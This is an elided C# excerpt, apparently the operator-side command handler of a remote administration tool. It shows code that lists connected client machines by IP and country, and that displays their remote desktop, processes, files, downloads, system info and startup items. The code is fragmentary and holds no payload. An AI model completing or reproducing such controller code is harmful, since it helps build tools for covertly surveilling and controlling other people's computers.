    ...
    public static class CommandHandler
    {
        ...
        public static void HandleInitialize(Client client, Initialize packet)
        {
            ...
            FrmMain.Instance.Invoke((MethodInvoker) delegate
            {
                try
                {
                    ...
                    var country = string.Format("{0} [{1}]", client.Value.Country, client.Value.CountryCode);

                    // this " " leaves some space between the flag-icon and the IP
                    var lvi = new ListViewItem(new[]
                    {
                        " " + client.EndPoint.Address, client.EndPoint.Port.ToString(), client.Value.Version,
                        "Connected",
        ...
        private static void ShowPopup(Client c)
        {
            FrmMain.Instance.nIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country),
                string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address, c.Value.OperatingSystem),
                ToolTipIcon.Info);
        }
        ...
        public static void HandleStatus(Client client, Status packet)
        {
            new Thread(() =>
            {
                foreach (ListViewItem lvi in FrmMain.Instance.lstClients.Items)
                {
                    ...
                    if (client == c)
                    {
                        FrmMain.Instance.Invoke((MethodInvoker) delegate { lvi.SubItems[3].Text = packet.Message; });
                        break;
                    }
                }
            }).Start();
        ...
        public static void HandleUserStatus(Client client, UserStatus packet)
        {
            new Thread(() =>
            {
                foreach (ListViewItem lvi in FrmMain.Instance.lstClients.Items)
                {
                    ...
                    if (client == c)
                    {
                        FrmMain.Instance.Invoke((MethodInvoker) delegate { lvi.SubItems[4].Text = packet.Message; });
                        break;
                    }
                }
            }).Start();
        ...
        public static void HandleRemoteDesktopResponse(Client client, DesktopResponse packet)
        {
            ...
            if (client.Value.LastDesktop == null)
            {
                ...
                using (var ms = new MemoryStream(packet.Image))
                {
                    var newScreen = client.Value.StreamCodec.DecodeData(ms);

                    client.Value.LastDesktop = newScreen;
                    client.Value.FrmRdp.Invoke(
                        (MethodInvoker) delegate { client.Value.FrmRdp.picDesktop.Image = (Bitmap) newScreen.Clone(); });
                    newScreen = null;
                }
            }
            else
        ...
        public static void HandleGetProcessesResponse(Client client, GetProcessesResponse packet)
        {
            ...
            new Thread(() =>
            {
                for (var i = 0; i < packet.Processes.Length; i++)
                {
                    if (packet.IDs[i] != 0 && packet.Processes[i] != "System.exe")
                    {
                        var lvi =
                            new ListViewItem(new[] {packet.Processes[i], packet.IDs[i].ToString(), packet.Titles[i]});
                        try
                        {
        ...
        public static void HandleDirectoryResponse(Client client, DirectoryResponse packet)
        {
            ...
            new Thread(() =>
            {
                var lviBack = new ListViewItem(new[] {"..", "", "Directory"});
                lviBack.Tag = "dir";
                ...
                {
                    for (var i = 0; i < packet.Folders.Length; i++)
                    {
                        if (packet.Folders[i] != DELIMITER)
                        {
                            var lvi = new ListViewItem(new[] {packet.Folders[i], "", "Directory"});
                            lvi.Tag = "dir";
        ...
        {
            var downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address);
            ...
            if (client.Value.FrmFm == null)
            {
                new DownloadFileCanceled(packet.ID).Execute(client);
            ...
            if (Continue)
            {
                ...
                var progress = Math.Round((decimal) ((packet.CurrentBlock + 1)/(double) packet.MaxBlocks*100.0), 2);
        ...
        public static void HandleGetSystemInfoResponse(Client client, GetSystemInfoResponse packet)
        {
            ...
            var j = 0;
            for (var i = 0; i < packet.SystemInfos.Length; i += 2)
            {
        ...
        public static void HandleGetStartupItemsResponse(Client client, GetStartupItemsResponse packet)
        {
            ...
            try
            {
                client.Value.FrmStm.Invoke((MethodInvoker) delegate
                {
                    ...
                    {
                        var temp = pair.Key.Split(new[] {"||"}, StringSplitOptions.None);
